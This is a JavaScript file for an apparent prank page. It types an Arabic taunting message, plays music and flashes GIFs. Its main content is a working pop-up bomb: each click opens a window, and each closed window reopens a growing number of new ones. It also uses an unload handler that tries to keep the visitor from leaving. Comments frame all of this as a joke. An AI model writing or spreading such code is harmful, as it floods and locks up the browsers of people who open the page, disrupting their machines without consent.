document.addEventListener("DOMContentLoaded", function () {
    let textContainer = document.getElementById("text-container");
    let gifContainer = document.getElementById("gif-container");
    let bgMusic = document.getElementById("bg-music");

    let message = "تم تلاعب فيك";
    let index = 0;

    function typeText() {
        if (index < message.length) {
            textContainer.innerHTML += message[index];
            index++;
            setTimeout(typeText, 200);
        } else {
            startGlitch();
        }
    }

    function startGlitch() {
        setTimeout(() => {
            textContainer.style.display = "none";
            gifContainer.style.opacity = 1;
            bgMusic.play();
            startImageLoop();
        }, 2000);
    }

    let gifList = [
        "https://media4.giphy.com/media/l0Iy6fCmhY3hVGrzW/giphy.gif",
        "https://media1.giphy.com/media/l0Iy8UHZ0T5I0EaR2/giphy.gif",
        "https://media2.giphy.com/media/xUA7aLpbS0S3kr3s76/giphy.gif"
    ];

    function startImageLoop() {
        let currentIndex = 0;
        setInterval(() => {
            document.getElementById("static-gif").src = gifList[currentIndex];
            currentIndex = (currentIndex + 1) % gifList.length;
        }, 400);
    }

    // 🟥🟥🟥🟥 **إضافة فتح نوافذ GIF عند الضغط على الشاشة** 🟥🟥🟥🟥
    let popupCount = 0;
    function openPopup() {
        let popupSize = 150;
        let screenWidth = window.innerWidth;
        let screenHeight = window.innerHeight;
        
        let x = Math.floor(Math.random() * (screenWidth - popupSize));
        let y = Math.floor(Math.random() * (screenHeight - popupSize));

        let newWindow = window.open("", "_blank", `width=${popupSize},height=${popupSize},left=${x},top=${y}`);
        if (newWindow) {
            let gifIndex = Math.floor(Math.random() * gifList.length);
            newWindow.document.write(`<img src="${gifList[gifIndex]}" width="100%" height="100%">`);
            newWindow.document.body.style.margin = "0";
            newWindow.document.body.style.overflow = "hidden";

            newWindow.onbeforeunload = function () {
                popupCount += 2;  // كل مرة يقفل، يفتح 2 بداله!
                for (let i = 0; i < popupCount; i++) {
                    openPopup();
                }
            };
        }
    }

    document.addEventListener("click", openPopup);

    // 🟥🟥🟥🟥 **إجبار الصفحة على البقاء مفتوحة (للمزاح فقط)** 🟥🟥🟥🟥
    window.onbeforeunload = function () {
        return "لا يمكنك المغادرة!";
    };

    typeText();
});